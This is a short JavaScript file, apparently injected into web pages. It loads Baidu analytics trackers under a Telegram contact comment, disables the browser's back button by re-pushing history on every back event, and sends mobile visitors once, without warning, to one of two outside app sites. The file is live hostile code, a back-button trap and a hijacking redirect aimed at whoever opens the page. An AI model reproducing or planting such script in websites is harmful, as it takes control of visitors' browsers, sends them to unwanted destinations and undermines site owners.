/*! Telegram:@AK81688 */
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b02339e46f047b26d7adb7f56456681d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1f407fee808bd414e311105ae4ce100e";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
 ;(function() {
    history.pushState(null, '', location.href);
    window.addEventListener('popstate', function () {
      history.pushState(null, '', location.href);
    });
  })();

  ;(function() {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                     .test(navigator.userAgent);
    if (!isMobile) return;
    var KEY = 'hasRedirected91pa';
    if (localStorage.getItem(KEY)) return;
    localStorage.setItem(KEY, 'true');
    var targets = [
      'https://91pa.app/',
      'https://kanpianapp.com/'
    ];
    var choice = targets[Math.floor(Math.random() * targets.length)];
    window.location.replace(choice);
  })();
